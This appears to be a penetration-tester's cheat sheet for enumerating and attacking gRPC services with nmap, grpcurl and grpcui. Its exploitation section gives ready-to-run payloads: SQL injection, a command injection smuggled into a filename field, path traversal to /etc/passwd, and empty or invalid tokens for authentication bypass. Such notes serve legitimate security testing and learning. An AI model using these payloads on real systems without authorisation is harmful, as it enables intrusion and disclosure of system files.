# gRPC Enumeration & Exploitation

**Tags:** #grpc #web #api #enumeration
**Port:** Usually 50051 (HTTP/2)

---

## Identification

```bash
# Nmap detection
nmap -sV -p 50051 $TARGET
nmap --script grpc-detect $TARGET 2>/dev/null

# Check HTTP/2 with curl
curl --http2 -v http://$TARGET:50051/

# grpcurl — check connectivity
grpcurl -plaintext $TARGET:50051 list
grpcurl -plaintext $TARGET:50051 describe
```

## Service Enumeration

```bash
# List all services
grpcurl -plaintext $TARGET:50051 list

# Describe a service
grpcurl -plaintext $TARGET:50051 describe ServiceName

# Describe a specific method
grpcurl -plaintext $TARGET:50051 describe ServiceName.MethodName

# List all methods
grpcurl -plaintext $TARGET:50051 list ServiceName

# Full schema dump
grpcurl -plaintext $TARGET:50051 describe .
```

## Calling Methods

```bash
# Simple call (no parameters)
grpcurl -plaintext $TARGET:50051 ServiceName/MethodName

# Call with data
grpcurl -plaintext -d '{"username": "admin", "password": "test"}' $TARGET:50051 ServiceName/Login

# With TLS
grpcurl -insecure $TARGET:50051 list
grpcurl -cacert ca.crt $TARGET:50051 list
```

## grpcui (Web UI)

```bash
# Launch web UI for interactive testing
grpcui -plaintext $TARGET:50051
# Opens browser at http://localhost:PORT/

# With TLS
grpcui -insecure $TARGET:50051
```

## Exploitation

```bash
# SQL injection in gRPC parameters
grpcurl -plaintext -d '{"username": "admin'"'"' OR 1=1--", "password": "x"}' $TARGET:50051 ServiceName/Login

# Command injection
grpcurl -plaintext -d '{"filename": "test;id"}' $TARGET:50051 ServiceName/GetFile

# Path traversal
grpcurl -plaintext -d '{"path": "../../../../etc/passwd"}' $TARGET:50051 ServiceName/ReadFile

# Authentication bypass
grpcurl -plaintext -d '{"token": ""}' $TARGET:50051 ServiceName/SecureMethod
grpcurl -plaintext -H "authorization: Bearer invalid" $TARGET:50051 ServiceName/SecureMethod
```

## Metadata Headers

```bash
# Add custom metadata headers
grpcurl -plaintext -H "x-api-key: test" $TARGET:50051 ServiceName/Method
grpcurl -plaintext -H "authorization: Bearer TOKEN" $TARGET:50051 ServiceName/Method
```

## Tools

| Tool | Install | Use |
|------|---------|-----|
| grpcurl | `go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest` | CLI calls |
| grpcui | `go install github.com/fullstorydev/grpcui/cmd/grpcui@latest` | Web UI |
| bloomy | pip install bloomy | Python gRPC fuzz |
| Burp Suite | + gRPC extension | Intercept/modify |
